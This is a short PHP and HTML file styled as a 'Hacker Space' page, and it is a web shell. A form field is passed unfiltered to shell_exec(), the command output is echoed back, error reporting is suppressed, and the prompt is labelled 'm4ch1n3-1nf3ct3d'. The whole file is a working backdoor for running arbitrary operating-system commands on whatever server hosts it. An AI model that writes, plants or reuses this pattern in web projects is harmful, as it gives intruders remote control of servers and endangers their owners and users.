<!DOCTYPE HTML>
<html>
    <head>
        <meta charset='iso-8859-1'/>
        <title>h͎4͎c͎k͎3͎r͎S͎p͎4͎c͎3͎.͎1͎.͎0͎</title>
        <link href="data:image/x-icon;base64,AAABAAEAEBAAAAAAAABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAEAAAAAAAAAAAAAAAEAAAAAAAAAAAAAXl5eAIKCggADA/8ACgoKAHNzcwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgICAgICAgICAgICAAAAAgIEBAQEBAQEBAQEAgIAAAIEBAQEBAQEBAQEBAQCAAACBAQDBAMDBAQEBAQEAgAAAgQEBAMEBAQEBAQEBAIAAAIEBAQEBAQEBAQEBAQCAAACBAQDBAMDBAQDAwQEAgAAAgQBBAMEBAQEBAQEBAIAAAIEBQQEBAQEBAQEBAQCAAACBAUFBAMDBAQDAwQEAgAAAgQFAQUEBAQEBAQEBAIAAAIEBAUFBQUBBAQEBAQCAAACAgQEBAQEBAQEBAQCAgAAAAICAgICAgICAgICAgAAAAAAAAAAAAAAAAAAAAAAAP//AADAAwAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAgAEAAIABAACAAQAAwAMAAP//AAA=" rel="icon" type="image/x-icon"/>
        <meta name='author' value='mathias'/>
    </head>
    <body style='background-color:black;color:white;font-family: courier;'>
        <div>
            <center>
                <h2>Welcome to your Hacker Space</h2>
                <h3>[!] Access Granted [!]</h3>
                <form method='post' action='h4ck3r5p4c3.php'>
                    <label for='msg'>Enter here:</label><br>
                    <input type='text' id='msg' name='texto' style='padding:8px;margin:5px;'></input><br>
                    <input type='submit' value='Execute'>
                </form>
                <h5>Made by: <a style="text-decoration: none;color:blanchedalmond;" href="https://github.com/titiomathias/">&copy; github.com/titiomathias/</a></h5>
                <img src='https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJ-eYPZnXLeLWX_GXVUVIgiJ1mygobau312lZ6XZFvXKeVgaAMd9tMDN2yXMylWGGolBU&usqp=CAU' width='60px'>
            </center>
        </div>
    </body>
</html> 
<?php
    error_reporting(0);
    ini_set("display_errrors", 0);
    $texto = $_POST['texto'];
    $sh = shell_exec($texto);
    echo "<p><b>m4ch1n3-1nf3ct3d~:</b> $texto</p>";
    echo $sh;
?>